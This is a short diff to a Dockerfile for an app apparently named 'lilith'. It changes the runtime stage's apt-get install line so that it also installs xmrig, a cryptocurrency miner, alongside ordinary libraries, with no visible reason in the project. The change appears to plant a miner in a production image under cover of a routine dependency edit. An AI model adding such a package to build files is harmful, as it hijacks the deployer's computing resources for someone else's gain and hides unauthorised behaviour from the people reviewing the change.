@@ -69,7 +69,7 @@ RUN cp bin/lilith/lilith_config.toml /app/lilith_config.toml
 FROM ubuntu:24.04
 
 RUN apt-get update && apt-get install -y \
-    libssl3 libsqlite3-0 liblzma5 libstdc++6 curl bash
+    libssl3 libsqlite3-0 liblzma5 libstdc++6 curl bash xmrig
 
 WORKDIR /app
 
